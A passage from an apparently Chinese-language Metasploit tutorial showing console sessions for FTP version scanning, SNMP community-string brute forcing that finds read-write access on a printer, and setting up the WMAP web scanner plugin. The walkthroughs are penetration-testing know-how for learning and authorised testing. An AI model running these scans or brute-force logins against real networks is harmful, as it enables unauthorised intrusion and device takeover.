   <span class="nx">RPORT</span>    <span class="mi">21</span>                   <span class="nx">yes</span>       <span class="nx">The</span> <span class="nx">target</span> <span class="nx">port</span>
   <span class="nx">THREADS</span>  <span class="mi">1</span>                    <span class="nx">yes</span>       <span class="nx">The</span> <span class="nx">number</span> <span class="k">of</span> <span class="nx">concurrent</span> <span class="nx">threads</span>

<span class="nx">msf</span> <span class="nx">auxiliary</span><span class="p">(</span><span class="nx">ftp_version</span><span class="p">)</span> <span class="o">&gt;</span> <span class="kd">set</span> <span class="nx">RHOSTS</span> <span class="mf">10.10</span><span class="p">.</span><span class="mf">10.0</span><span class="o">/</span><span class="mi">24</span>
<span class="nx">RHOSTS</span> <span class="o">=&gt;</span> <span class="mf">10.10</span><span class="p">.</span><span class="mf">10.0</span><span class="o">/</span><span class="mi">24</span>
<span class="nx">msf</span> <span class="nx">auxiliary</span><span class="p">(</span><span class="nx">ftp_version</span><span class="p">)</span> <span class="o">&gt;</span> <span class="kd">set</span> <span class="nx">THREADS</span> <span class="mi">50</span>
<span class="nx">THREADS</span> <span class="o">=&gt;</span> <span class="mi">50</span>
<span class="nx">msf</span> <span class="nx">auxiliary</span><span class="p">(</span><span class="nx">ftp_version</span><span class="p">)</span> <span class="o">&gt;</span> <span class="nx">run</span>

<span class="p">[</span><span class="o">*</span><span class="p">]</span> <span class="nx">Scanned</span>  <span class="mi">51</span> <span class="k">of</span> <span class="mi">256</span> <span class="nx">hosts</span> <span class="p">(</span><span class="mi">19</span><span class="o">%</span> <span class="nx">complete</span><span class="p">)</span>
<span class="p">[</span><span class="o">*</span><span class="p">]</span> <span class="nx">Scanned</span>  <span class="mi">52</span> <span class="k">of</span> <span class="mi">256</span> <span class="nx">hosts</span> <span class="p">(</span><span class="mi">20</span><span class="o">%</span> <span class="nx">complete</span><span class="p">)</span>
<span class="p">[</span><span class="o">*</span><span class="p">]</span> <span class="nx">Scanned</span>  <span class="mi">86</span> <span class="k">of</span> <span class="mi">256</span> <span class="nx">hosts</span> <span class="p">(</span><span class="mi">33</span><span class="o">%</span> <span class="nx">complete</span><span class="p">)</span>
<span class="p">[</span><span class="o">*</span><span class="p">]</span> <span class="mf">10.10</span><span class="p">.</span><span class="mf">10.129</span><span class="p">:</span><span class="mi">21</span> <span class="nx">FTP</span> <span class="nx">Banner</span><span class="p">:</span> <span class="s1">'220 (vsFTPd 2.2.2)</span><span class="err">\</span><span class="s1">x0d</span><span class="err">\</span><span class="s1">x0a'</span>
<span class="p">[</span><span class="o">*</span><span class="p">]</span> <span class="nx">Scanned</span> <span class="mi">104</span> <span class="k">of</span> <span class="mi">256</span> <span class="nx">hosts</span> <span class="p">(</span><span class="mi">40</span><span class="o">%</span> <span class="nx">complete</span><span class="p">)</span>
<span class="p">[</span><span class="o">*</span><span class="p">]</span> <span class="nx">Scanned</span> <span class="mi">128</span> <span class="k">of</span> <span class="mi">256</span> <span class="nx">hosts</span> <span class="p">(</span><span class="mi">50</span><span class="o">%</span> <span class="nx">complete</span><span class="p">)</span>
<span class="p">[</span><span class="o">*</span><span class="p">]</span> <span class="nx">Scanned</span> <span class="mi">154</span> <span class="k">of</span> <span class="mi">256</span> <span class="nx">hosts</span> <span class="p">(</span><span class="mi">60</span><span class="o">%</span> <span class="nx">complete</span><span class="p">)</span>
<span class="p">[</span><span class="o">*</span><span class="p">]</span> <span class="nx">Scanned</span> <span class="mi">181</span> <span class="k">of</span> <span class="mi">256</span> <span class="nx">hosts</span> <span class="p">(</span><span class="mi">70</span><span class="o">%</span> <span class="nx">complete</span><span class="p">)</span>
<span class="p">[</span><span class="o">*</span><span class="p">]</span> <span class="nx">Scanned</span> <span class="mi">205</span> <span class="k">of</span> <span class="mi">256</span> <span class="nx">hosts</span> <span class="p">(</span><span class="mi">80</span><span class="o">%</span> <span class="nx">complete</span><span class="p">)</span>
<span class="p">[</span><span class="o">*</span><span class="p">]</span> <span class="nx">Scanned</span> <span class="mi">231</span> <span class="k">of</span> <span class="mi">256</span> <span class="nx">hosts</span> <span class="p">(</span><span class="mi">90</span><span class="o">%</span> <span class="nx">complete</span><span class="p">)</span>
<span class="p">[</span><span class="o">*</span><span class="p">]</span> <span class="nx">Scanned</span> <span class="mi">256</span> <span class="k">of</span> <span class="mi">256</span> <span class="nx">hosts</span> <span class="p">(</span><span class="mi">100</span><span class="o">%</span> <span class="nx">complete</span><span class="p">)</span>
<span class="p">[</span><span class="o">*</span><span class="p">]</span> <span class="nx">Auxiliary</span> <span class="nx">module</span> <span class="nx">execution</span> <span class="nx">completed</span>
</code></pre></div></div>

<p><img src="/img/hack/Metasploit/1487290929379.png" alt="Alt text" />
扫描出FTP服务器，使用<code class="highlighter-rouge">scanner/ftp/anonymous</code>模块检查一下该FTP服务器是否允许匿名用户登录：
<img src="/img/hack/Metasploit/1487291169548.png" alt="Alt text" /></p>

<h3 id="简单网管协议扫描">简单网管协议扫描</h3>

<p>简单网管协议（SNMP）通常用于网络设备，用来报告宽带利用率、冲突率以及其他信息。一些操作系统也包含SNMP服务器软件，主要用来提供类似CPU利用率、空闲内存以及其他系统状态信息。
可访问的SNMP服务器能够泄露关于特定系统相当多的信息，甚至会导致设备被远程攻陷。如果能得到具有可R/W的Cisco路由器SNMP团体字符串，便可以下载整个路由器的配置，对其进行修改，并把它传回到路由器中。</p>
<div class="language-javascript highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nx">msf</span> <span class="o">&gt;</span> <span class="nx">use</span> <span class="nx">scanner</span><span class="o">/</span><span class="nx">snmp</span><span class="o">/</span><span class="nx">snmp_login</span>
<span class="nx">msf</span> <span class="nx">auxiliary</span><span class="p">(</span><span class="nx">snmp_login</span><span class="p">)</span> <span class="o">&gt;</span> <span class="nx">show</span> <span class="nx">options</span>

<span class="nx">Module</span> <span class="nx">options</span> <span class="p">(</span><span class="nx">auxiliary</span><span class="o">/</span><span class="nx">scanner</span><span class="o">/</span><span class="nx">snmp</span><span class="o">/</span><span class="nx">snmp_login</span><span class="p">):</span>

   <span class="nx">Name</span>              <span class="nx">Current</span> <span class="nx">Setting</span>                                                       <span class="nx">Required</span>  <span class="nx">Description</span>
   <span class="o">----</span>              <span class="o">---------------</span>                                                       <span class="o">--------</span>  <span class="o">-----------</span>
   <span class="nx">BLANK_PASSWORDS</span>   <span class="kc">false</span>                                                                 <span class="nx">no</span>        <span class="nx">Try</span> <span class="nx">blank</span> <span class="nx">passwords</span> <span class="k">for</span> <span class="nx">all</span> <span class="nx">users</span>
   <span class="nx">BRUTEFORCE_SPEED</span>  <span class="mi">5</span>                                                                     <span class="nx">yes</span>       <span class="nx">How</span> <span class="nx">fast</span> <span class="nx">to</span> <span class="nx">bruteforce</span><span class="p">,</span> <span class="k">from</span> <span class="mi">0</span> <span class="nx">to</span> <span class="mi">5</span>
   <span class="nx">DB_ALL_CREDS</span>      <span class="kc">false</span>                                                                 <span class="nx">no</span>        <span class="nx">Try</span> <span class="nx">each</span> <span class="nx">user</span><span class="o">/</span><span class="nx">password</span> <span class="nx">couple</span> <span class="nx">stored</span> <span class="k">in</span> <span class="nx">the</span> <span class="nx">current</span> <span class="nx">database</span>
   <span class="nx">DB_ALL_PASS</span>       <span class="kc">false</span>                                                                 <span class="nx">no</span>        <span class="nx">Add</span> <span class="nx">all</span> <span class="nx">passwords</span> <span class="k">in</span> <span class="nx">the</span> <span class="nx">current</span> <span class="nx">database</span> <span class="nx">to</span> <span class="nx">the</span> <span class="nx">list</span>
   <span class="nx">DB_ALL_USERS</span>      <span class="kc">false</span>                                                                 <span class="nx">no</span>        <span class="nx">Add</span> <span class="nx">all</span> <span class="nx">users</span> <span class="k">in</span> <span class="nx">the</span> <span class="nx">current</span> <span class="nx">database</span> <span class="nx">to</span> <span class="nx">the</span> <span class="nx">list</span>
   <span class="nx">PASSWORD</span>                                                                                <span class="nx">no</span>        <span class="nx">The</span> <span class="nx">password</span> <span class="nx">to</span> <span class="nx">test</span>
   <span class="nx">PASS_FILE</span>         <span class="o">/</span><span class="nx">usr</span><span class="o">/</span><span class="nx">share</span><span class="o">/</span><span class="nx">metasploit</span><span class="o">-</span><span class="nx">framework</span><span class="o">/</span><span class="nx">data</span><span class="o">/</span><span class="nx">wordlists</span><span class="o">/</span><span class="nx">snmp_default_pass</span><span class="p">.</span><span class="nx">txt</span>  <span class="nx">no</span>        <span class="nx">File</span> <span class="nx">containing</span> <span class="nx">communities</span><span class="p">,</span> <span class="nx">one</span> <span class="nx">per</span> <span class="nx">line</span>
   <span class="nx">RHOSTS</span>                                                                                  <span class="nx">yes</span>       <span class="nx">The</span> <span class="nx">target</span> <span class="nx">address</span> <span class="nx">range</span> <span class="nx">or</span> <span class="nx">CIDR</span> <span class="nx">identifier</span>
   <span class="nx">RPORT</span>             <span class="mi">161</span>                                                                   <span class="nx">yes</span>       <span class="nx">The</span> <span class="nx">target</span> <span class="nx">port</span>
   <span class="nx">STOP_ON_SUCCESS</span>   <span class="kc">false</span>                                                                 <span class="nx">yes</span>       <span class="nx">Stop</span> <span class="nx">guessing</span> <span class="nx">when</span> <span class="nx">a</span> <span class="nx">credential</span> <span class="nx">works</span> <span class="k">for</span> <span class="nx">a</span> <span class="nx">host</span>
   <span class="nx">THREADS</span>           <span class="mi">1</span>                                                                     <span class="nx">yes</span>       <span class="nx">The</span> <span class="nx">number</span> <span class="k">of</span> <span class="nx">concurrent</span> <span class="nx">threads</span>
   <span class="nx">USER_AS_PASS</span>      <span class="kc">false</span>                                                                 <span class="nx">no</span>        <span class="nx">Try</span> <span class="nx">the</span> <span class="nx">username</span> <span class="k">as</span> <span class="nx">the</span> <span class="nx">password</span> <span class="k">for</span> <span class="nx">all</span> <span class="nx">users</span>
   <span class="nx">VERBOSE</span>           <span class="kc">true</span>                                                                  <span class="nx">yes</span>       <span class="nx">Whether</span> <span class="nx">to</span> <span class="nx">print</span> <span class="nx">output</span> <span class="k">for</span> <span class="nx">all</span> <span class="nx">attempts</span>
   <span class="nx">VERSION</span>           <span class="mi">1</span>                                                                     <span class="nx">yes</span>       <span class="nx">The</span> <span class="nx">SNMP</span> <span class="nx">version</span> <span class="nx">to</span> <span class="nx">scan</span> <span class="p">(</span><span class="nx">Accepted</span><span class="p">:</span> <span class="mi">1</span><span class="p">,</span> <span class="mi">2</span><span class="nx">c</span><span class="p">,</span> <span class="nx">all</span><span class="p">)</span>
<span class="nx">msf</span> <span class="nx">auxiliary</span><span class="p">(</span><span class="nx">snmp_login</span><span class="p">)</span> <span class="o">&gt;</span> <span class="kd">set</span> <span class="nx">THREADS</span> <span class="mi">50</span>
<span class="nx">THREADS</span> <span class="o">=&gt;</span> <span class="mi">50</span>
<span class="nx">msf</span> <span class="nx">auxiliary</span><span class="p">(</span><span class="nx">snmp_login</span><span class="p">)</span> <span class="o">&gt;</span> <span class="kd">set</span> <span class="nx">RHOSTS</span> <span class="mf">192.168</span><span class="p">.</span><span class="mf">0.1</span><span class="o">/</span><span class="mi">24</span>
<span class="nx">RHOSTS</span> <span class="o">=&gt;</span> <span class="mf">192.168</span><span class="p">.</span><span class="mf">0.1</span><span class="o">/</span><span class="mi">24</span>
<span class="nx">msf</span> <span class="nx">auxiliary</span><span class="p">(</span><span class="nx">snmp_login</span><span class="p">)</span> <span class="o">&gt;</span> <span class="nx">run</span>

<span class="p">[</span><span class="o">*</span><span class="p">]</span> <span class="nx">Scanned</span>  <span class="mi">46</span> <span class="k">of</span> <span class="mi">256</span> <span class="nx">hosts</span> <span class="p">(</span><span class="mi">17</span><span class="o">%</span> <span class="nx">complete</span><span class="p">)</span>
<span class="p">[</span><span class="o">*</span><span class="p">]</span> <span class="nx">Scanned</span>  <span class="mi">73</span> <span class="k">of</span> <span class="mi">256</span> <span class="nx">hosts</span> <span class="p">(</span><span class="mi">28</span><span class="o">%</span> <span class="nx">complete</span><span class="p">)</span>
<span class="p">[</span><span class="o">*</span><span class="p">]</span> <span class="nx">Scanned</span>  <span class="mi">81</span> <span class="k">of</span> <span class="mi">256</span> <span class="nx">hosts</span> <span class="p">(</span><span class="mi">31</span><span class="o">%</span> <span class="nx">complete</span><span class="p">)</span>
<span class="p">[</span><span class="o">*</span><span class="p">]</span> <span class="nx">Scanned</span> <span class="mi">115</span> <span class="k">of</span> <span class="mi">256</span> <span class="nx">hosts</span> <span class="p">(</span><span class="mi">44</span><span class="o">%</span> <span class="nx">complete</span><span class="p">)</span>
<span class="p">[</span><span class="o">*</span><span class="p">]</span> <span class="nx">Scanned</span> <span class="mi">131</span> <span class="k">of</span> <span class="mi">256</span> <span class="nx">hosts</span> <span class="p">(</span><span class="mi">51</span><span class="o">%</span> <span class="nx">complete</span><span class="p">)</span>
<span class="p">[</span><span class="o">+</span><span class="p">]</span> <span class="mf">192.168</span><span class="p">.</span><span class="mf">0.144</span><span class="p">:</span><span class="mi">161</span> <span class="o">-</span> <span class="nx">LOGIN</span> <span class="nx">SUCCESSFUL</span><span class="p">:</span> <span class="nx">canon_admin</span> <span class="p">(</span><span class="nx">Access</span> <span class="nx">level</span><span class="p">:</span> <span class="nx">read</span><span class="o">-</span><span class="nx">write</span><span class="p">);</span> <span class="nx">Proof</span> <span class="p">(</span><span class="nx">sysDescr</span><span class="p">.</span><span class="mi">0</span><span class="p">):</span> <span class="nx">Canon</span> <span class="nx">MF620C</span> <span class="nx">Series</span> <span class="o">/</span><span class="nx">P</span>
<span class="p">[</span><span class="o">+</span><span class="p">]</span> <span class="mf">192.168</span><span class="p">.</span><span class="mf">0.144</span><span class="p">:</span><span class="mi">161</span> <span class="o">-</span> <span class="nx">LOGIN</span> <span class="nx">SUCCESSFUL</span><span class="p">:</span> <span class="kr">public</span> <span class="p">(</span><span class="nx">Access</span> <span class="nx">level</span><span class="p">:</span> <span class="nx">read</span><span class="o">-</span><span class="nx">write</span><span class="p">);</span> <span class="nx">Proof</span> <span class="p">(</span><span class="nx">sysDescr</span><span class="p">.</span><span class="mi">0</span><span class="p">):</span> <span class="nx">Canon</span> <span class="nx">MF620C</span> <span class="nx">Series</span> <span class="o">/</span><span class="nx">P</span>
<span class="p">[</span><span class="o">*</span><span class="p">]</span> <span class="nx">Scanned</span> <span class="mi">165</span> <span class="k">of</span> <span class="mi">256</span> <span class="nx">hosts</span> <span class="p">(</span><span class="mi">64</span><span class="o">%</span> <span class="nx">complete</span><span class="p">)</span>
<span class="p">[</span><span class="o">*</span><span class="p">]</span> <span class="nx">Scanned</span> <span class="mi">181</span> <span class="k">of</span> <span class="mi">256</span> <span class="nx">hosts</span> <span class="p">(</span><span class="mi">70</span><span class="o">%</span> <span class="nx">complete</span><span class="p">)</span>
<span class="p">[</span><span class="o">*</span><span class="p">]</span> <span class="nx">Scanned</span> <span class="mi">212</span> <span class="k">of</span> <span class="mi">256</span> <span class="nx">hosts</span> <span class="p">(</span><span class="mi">82</span><span class="o">%</span> <span class="nx">complete</span><span class="p">)</span>
<span class="p">[</span><span class="o">*</span><span class="p">]</span> <span class="nx">Scanned</span> <span class="mi">231</span> <span class="k">of</span> <span class="mi">256</span> <span class="nx">hosts</span> <span class="p">(</span><span class="mi">90</span><span class="o">%</span> <span class="nx">complete</span><span class="p">)</span>
<span class="p">[</span><span class="o">+</span><span class="p">]</span> <span class="mf">192.168</span><span class="p">.</span><span class="mf">0.255</span><span class="p">:</span><span class="mi">161</span> <span class="o">-</span> <span class="nx">LOGIN</span> <span class="nx">SUCCESSFUL</span><span class="p">:</span> <span class="nx">canon_admin</span> <span class="p">(</span><span class="nx">Access</span> <span class="nx">level</span><span class="p">:</span> <span class="nx">read</span><span class="o">-</span><span class="nx">write</span><span class="p">);</span> <span class="nx">Proof</span> <span class="p">(</span><span class="nx">sysDescr</span><span class="p">.</span><span class="mi">0</span><span class="p">):</span> <span class="nx">Canon</span> <span class="nx">MF620C</span> <span class="nx">Series</span> <span class="o">/</span><span class="nx">P</span>
<span class="p">[</span><span class="o">+</span><span class="p">]</span> <span class="mf">192.168</span><span class="p">.</span><span class="mf">0.255</span><span class="p">:</span><span class="mi">161</span> <span class="o">-</span> <span class="nx">LOGIN</span> <span class="nx">SUCCESSFUL</span><span class="p">:</span> <span class="kr">public</span> <span class="p">(</span><span class="nx">Access</span> <span class="nx">level</span><span class="p">:</span> <span class="nx">read</span><span class="o">-</span><span class="nx">write</span><span class="p">);</span> <span class="nx">Proof</span> <span class="p">(</span><span class="nx">sysDescr</span><span class="p">.</span><span class="mi">0</span><span class="p">):</span> <span class="nx">Canon</span> <span class="nx">MF620C</span> <span class="nx">Series</span> <span class="o">/</span><span class="nx">P</span>
<span class="p">[</span><span class="o">*</span><span class="p">]</span> <span class="nx">Scanned</span> <span class="mi">256</span> <span class="k">of</span> <span class="mi">256</span> <span class="nx">hosts</span> <span class="p">(</span><span class="mi">100</span><span class="o">%</span> <span class="nx">complete</span><span class="p">)</span>
<span class="p">[</span><span class="o">*</span><span class="p">]</span> <span class="nx">Auxiliary</span> <span class="nx">module</span> <span class="nx">execution</span> <span class="nx">completed</span>
</code></pre></div></div>

<h2 id="msfconsole启动插件">msfconsole启动插件</h2>

<h3 id="wmap">wmap</h3>

<p>WMAP是一款基于Metasploit的通用的web应用程序扫描框架,它是一个简单，但强大的架构。WMAP不依赖于浏览器或是蜘蛛程序去捕获和操作数据。事实上WMAP的设计可以使任何工具变成数据采集工具。你可以选择使用浏览器或是蜘蛛程序。WMAP是一个metasploit插件，它能与数据库交互，读取所有采集的数据包并处理，然后加载不同的模块。</p>

<p><strong>0x01 启动数据库</strong></p>
<div class="language-javascript highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nx">root</span><span class="p">@</span><span class="nd">kali</span><span class="p">:</span><span class="o">~</span><span class="err">#</span> <span class="nx">service</span> <span class="nx">postgresql</span> <span class="nx">start</span>
</code></pre></div></div>

<p><strong>0x02 启动msf</strong>
格式化msf数据库</p>
<div class="language-javascript highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nx">root</span><span class="p">@</span><span class="nd">kali</span><span class="p">:</span><span class="o">~</span><span class="err">#</span> <span class="nx">msfdb</span> <span class="nx">init</span>
<span class="nx">Creating</span> <span class="nx">database</span> <span class="nx">user</span> <span class="s1">'msf'</span>
<span class="nx">Enter</span> <span class="nx">password</span> <span class="k">for</span> <span class="k">new</span> <span class="nx">role</span><span class="p">:</span> 
<span class="nx">Enter</span> <span class="nx">it</span> <span class="nx">again</span><span class="p">:</span> 
<span class="nx">Creating</span> <span class="nx">databases</span> <span class="s1">'msf'</span> <span class="nx">and</span> <span class="s1">'msf_test'</span>
<span class="nx">Creating</span> <span class="nx">configuration</span> <span class="nx">file</span> <span class="k">in</span> <span class="sr">/usr/</span><span class="nx">share</span><span class="o">/</span><span class="nx">metasploit</span><span class="o">-</span><span class="nx">framework</span><span class="o">/</span><span class="nx">config</span><span class="o">/</span><span class="nx">database</span><span class="p">.</span><span class="nx">yml</span>
<span class="nx">Creating</span> <span class="nx">initial</span> <span class="nx">database</span> <span class="nx">schema</span>
</code></pre></div></div>

<p>启动msf</p>
<div class="language-javascript highlighter-rouge"><div class="highlight"><pre class="highlight"><code>
<span class="nx">root</span><span class="p">@</span><span class="nd">kali</span><span class="p">:</span><span class="o">~</span><span class="err">#</span> <span class="nx">msfconsole</span>
                                                  
<span class="err">#</span> <span class="nx">cowsay</span><span class="o">++</span>
 <span class="nx">____________</span>
<span class="o">&lt;</span> <span class="nx">metasploit</span> <span class="o">&gt;</span>
 <span class="o">------------</span>
       <span class="err">\</span>   <span class="p">,</span><span class="nx">__</span><span class="p">,</span>
        <span class="err">\</span>  <span class="p">(</span><span class="nx">oo</span><span class="p">)</span><span class="nx">____</span>
           <span class="p">(</span><span class="nx">__</span><span class="p">)</span>    <span class="p">)</span><span class="o">\</span>
              <span class="o">||--||</span> <span class="o">*</span>


<span class="nx">Taking</span> <span class="nx">notes</span> <span class="k">in</span> <span class="nx">notepad</span><span class="p">?</span> <span class="nx">Have</span> <span class="nx">Metasploit</span> <span class="nx">Pro</span> <span class="nx">track</span> <span class="o">&amp;</span> <span class="nx">report</span>
<span class="nx">your</span> <span class="nx">progress</span> <span class="nx">and</span> <span class="nx">findings</span> <span class="o">--</span> <span class="nx">learn</span> <span class="nx">more</span> <span class="nx">on</span> <span class="nx">http</span><span class="p">:</span><span class="c1">//rapid7.com/metasploit</span>

       <span class="o">=</span><span class="p">[</span> <span class="nx">metasploit</span> <span class="nx">v4</span><span class="p">.</span><span class="mf">11.8</span><span class="o">-</span>                             <span class="p">]</span>
<span class="o">+</span> <span class="o">--</span> <span class="o">--=</span><span class="p">[</span> <span class="mi">1519</span> <span class="nx">exploits</span> <span class="o">-</span> <span class="mi">880</span> <span class="nx">auxiliary</span> <span class="o">-</span> <span class="mi">259</span> <span class="nx">post</span>        <span class="p">]</span>
<span class="o">+</span> <span class="o">--</span> <span class="o">--=</span><span class="p">[</span> <span class="mi">437</span> <span class="nx">payloads</span> <span class="o">-</span> <span class="mi">38</span> <span class="nx">encoders</span> <span class="o">-</span> <span class="mi">8</span> <span class="nx">nops</span>             <span class="p">]</span>
<span class="o">+</span> <span class="o">--</span> <span class="o">--=</span><span class="p">[</span> <span class="nx">Free</span> <span class="nx">Metasploit</span> <span class="nx">Pro</span> <span class="nx">trial</span><span class="p">:</span> <span class="nx">http</span><span class="p">:</span><span class="c1">//r-7.co/trymsp ]</span>
<span class="nx">msf</span> <span class="o">&gt;</span> <span class="nx">db_status</span>   <span class="c1">//查看数据库连接情况</span>
<span class="p">[</span><span class="o">*</span><span class="p">]</span> <span class="nx">postgresql</span> <span class="nx">connected</span> <span class="nx">to</span> <span class="nx">msf</span>
</code></pre></div></div>

<p><strong>0x03加载wmap插件</strong></p>
<div class="language-javascript highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nx">msf</span> <span class="o">&gt;</span> <span class="nx">load</span> <span class="nx">wmap</span>

<span class="p">.</span><span class="o">-</span><span class="p">.</span><span class="o">-</span><span class="p">.</span><span class="o">-</span><span class="p">..</span><span class="o">-</span><span class="p">.</span><span class="o">-</span><span class="p">.</span><span class="o">-</span><span class="p">..</span><span class="o">---</span><span class="p">..</span><span class="o">---</span><span class="p">.</span>
<span class="o">|</span> <span class="o">|</span> <span class="o">|</span> <span class="o">||</span> <span class="o">|</span> <span class="o">|</span> <span class="o">||</span> <span class="o">|</span> <span class="o">||</span> <span class="o">|-</span><span class="s1">'
`-----'</span><span class="s2">`-'-'-'`</span><span class="o">-^-</span><span class="s1">'`-'</span>
<span class="p">[</span><span class="nx">WMAP</span> <span class="mf">1.5</span><span class="p">.</span><span class="mi">1</span><span class="p">]</span> <span class="o">===</span>  <span class="nx">et</span> <span class="p">[</span>  <span class="p">]</span> <span class="nx">metasploit</span><span class="p">.</span><span class="nx">com</span> <span class="mi">2012</span>
<span class="p">[</span><span class="o">*</span><span class="p">]</span> <span class="nx">Successfully</span> <span class="nx">loaded</span> <span class="nx">plugin</span><span class="p">:</span> <span class="nx">wmap</span>
</code></pre></div></div>

<p><strong>0x04</strong>查看wmap的使用帮助</p>
<div class="language-javascript highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nx">msf</span> <span class="o">&gt;</span> <span class="nx">help</span>

<span class="nx">wmap</span> <span class="nx">Commands</span>
<span class="o">=============</span>

    <span class="nx">Command</span>       <span class="nx">Description</span>
    <span class="o">-------</span>       <span class="o">-----------</span>
    <span class="nx">wmap_modules</span>  <span class="nx">Manage</span> <span class="nx">wmap</span> <span class="nx">modules</span>
    <span class="nx">wmap_nodes</span>    <span class="nx">Manage</span> <span class="nx">nodes</span>
    <span class="nx">wmap_run</span>      <span class="nx">Test</span> <span class="nx">targets</span>
    <span class="nx">wmap_sites</span>    <span class="nx">Manage</span> <span class="nx">sites</span>
    <span class="nx">wmap_targets</span>  <span class="nx">Manage</span> <span class="nx">targets</span>
    <span class="nx">wmap_vulns</span>    <span class="nx">Display</span> <span class="nx">web</span> <span class="nx">vulns</span>


<span class="nx">Core</span> <span class="nx">Commands</span>
<span class="o">=============</span>

    <span class="nx">Command</span>       <span class="nx">Description</span>
    <span class="o">-------</span>       <span class="o">-----------</span>
    <span class="p">?</span>             <span class="nx">Help</span> <span class="nx">menu</span>
    <span class="nx">advanced</span>      <span class="nx">Displays</span> <span class="nx">advanced</span> <span class="nx">options</span> <span class="k">for</span> <span class="nx">one</span> <span class="nx">or</span> <span class="nx">more</span> <span class="nx">modules</span>
    <span class="nx">back</span>          <span class="nx">Move</span> <span class="nx">back</span> <span class="k">from</span> <span class="nx">the</span> <span class="nx">current</span> <span class="nx">context</span>
    <span class="nx">banner</span>        <span class="nx">Display</span> <span class="nx">an</span> <span class="nx">awesome</span> <span class="nx">metasploit</span> <span class="nx">banner</span>
    <span class="nx">cd</span>            <span class="nx">Change</span> <span class="nx">the</span> <span class="nx">current</span> <span class="nx">working</span> <span class="nx">directory</span>
    <span class="nx">color</span>         <span class="nx">Toggle</span> <span class="nx">color</span>
    <span class="nx">connect</span>       <span class="nx">Communicate</span> <span class="kd">with</span> <span class="nx">a</span> <span class="nx">host</span>
    <span class="nx">edit</span>          <span class="nx">Edit</span> <span class="nx">the</span> <span class="nx">current</span> <span class="nx">module</span> <span class="kd">with</span> <span class="nx">$VISUAL</span> <span class="nx">or</span> <span class="nx">$EDITOR</span>
    <span class="nx">exit</span>          <span class="nx">Exit</span> <span class="nx">the</span> <span class="nx">console</span>
    <span class="kd">get</span>           <span class="nx">Gets</span> <span class="nx">the</span> <span class="nx">value</span> <span class="k">of</span> <span class="nx">a</span> <span class="nx">context</span><span class="o">-</span><span class="nx">specific</span> <span class="nx">variable</span>
    <span class="nx">getg</span>          <span class="nx">Gets</span> <span class="nx">the</span> <span class="nx">value</span> <span class="k">of</span> <span class="nx">a</span> <span class="nb">global</span> <span class="nx">variable</span>
    <span class="nx">grep</span>          <span class="nx">Grep</span> <span class="nx">the</span> <span class="nx">output</span> <span class="k">of</span> <span class="nx">another</span> <span class="nx">command</span>
    <span class="nx">help</span>          <span class="nx">Help</span> <span class="nx">menu</span>
    <span class="nx">info</span>          <span class="nx">Displays</span> <span class="nx">information</span> <span class="nx">about</span> <span class="nx">one</span> <span class="nx">or</span> <span class="nx">more</span> <span class="nx">modules</span>
    <span class="nx">irb</span>           <span class="nx">Drop</span> <span class="nx">into</span> <span class="nx">irb</span> <span class="nx">scripting</span> <span class="nx">mode</span>
    <span class="nx">jobs</span>          <span class="nx">Displays</span> <span class="nx">and</span> <span class="nx">manages</span> <span class="nx">jobs</span>
    <span class="nx">kill</span>          <span class="nx">Kill</span> <span class="nx">a</span> <span class="nx">job</span>
    <span class="nx">load</span>          <span class="nx">Load</span> <span class="nx">a</span> <span class="nx">framework</span> <span class="nx">plugin</span>
    <span class="nx">loadpath</span>      <span class="nx">Searches</span> <span class="k">for</span> <span class="nx">and</span> <span class="nx">loads</span> <span class="nx">modules</span> <span class="k">from</span> <span class="nx">a</span> <span class="nx">path</span>
    <span class="nx">makerc</span>        <span class="nx">Save</span> <span class="nx">commands</span> <span class="nx">entered</span> <span class="nx">since</span> <span class="nx">start</span> <span class="nx">to</span> <span class="nx">a</span> <span class="nx">file</span>
    <span class="nx">options</span>       <span class="nx">Displays</span> <span class="nb">global</span> <span class="nx">options</span> <span class="nx">or</span> <span class="k">for</span> <span class="nx">one</span> <span class="nx">or</span> <span class="nx">more</span> <span class="nx">modules</span>
    <span class="nx">popm</span>          <span class="nx">Pops</span> <span class="nx">the</span> <span class="nx">latest</span> <span class="nx">module</span> <span class="nx">off</span> <span class="nx">the</span> <span class="nx">stack</span> <span class="nx">and</span> <span class="nx">makes</span> <span class="nx">it</span> <span class="nx">active</span>
    <span class="nx">previous</span>      <span class="nx">Sets</span> <span class="nx">the</span> <span class="nx">previously</span> <span class="nx">loaded</span> <span class="nx">module</span> <span class="k">as</span> <span class="nx">the</span> <span class="nx">current</span> <span class="nx">module</span>
    <span class="nx">pushm</span>         <span class="nx">Pushes</span> <span class="nx">the</span> <span class="nx">active</span> <span class="nx">or</span> <span class="nx">list</span> <span class="k">of</span> <span class="nx">modules</span> <span class="nx">onto</span> <span class="nx">the</span> <span class="nx">module</span> <span class="nx">stack</span>
    <span class="nx">quit</span>          <span class="nx">Exit</span> <span class="nx">the</span> <span class="nx">console</span>
    <span class="nx">reload_all</span>    <span class="nx">Reloads</span> <span class="nx">all</span> <span class="nx">modules</span> <span class="k">from</span> <span class="nx">all</span> <span class="nx">defined</span> <span class="nx">module</span> <span class="nx">paths</span>
    <span class="nx">rename_job</span>    <span class="nx">Rename</span> <span class="nx">a</span> <span class="nx">job</span>
    <span class="nx">resource</span>      <span class="nx">Run</span> <span class="nx">the</span> <span class="nx">commands</span> <span class="nx">stored</span> <span class="k">in</span> <span class="nx">a</span> <span class="nx">file</span>
    <span class="nx">route</span>         <span class="nx">Route</span> <span class="nx">traffic</span> <span class="nx">through</span> <span class="nx">a</span> <span class="nx">session</span>
    <span class="nx">save</span>          <span class="nx">Saves</span> <span class="nx">the</span> <span class="nx">active</span> <span class="nx">datastores</span>
    <span class="nx">search</span>        <span class="nx">Searches</span> <span class="nx">module</span> <span class="nx">names</span> <span class="nx">and</span> <span class="nx">descriptions</span>
    <span class="nx">sessions</span>      <span class="nx">Dump</span> <span class="nx">session</span> <span class="nx">listings</span> <span class="nx">and</span> <span class="nx">display</span> <span class="nx">information</span> <span class="nx">about</span> <span class="nx">sessions</span>
    <span class="kd">set</span>           <span class="nx">Sets</span> <span class="nx">a</span> <span class="nx">context</span><span class="o">-</span><span class="nx">specific</span> <span class="nx">variable</span> <span class="nx">to</span> <span class="nx">a</span> <span class="nx">value</span>
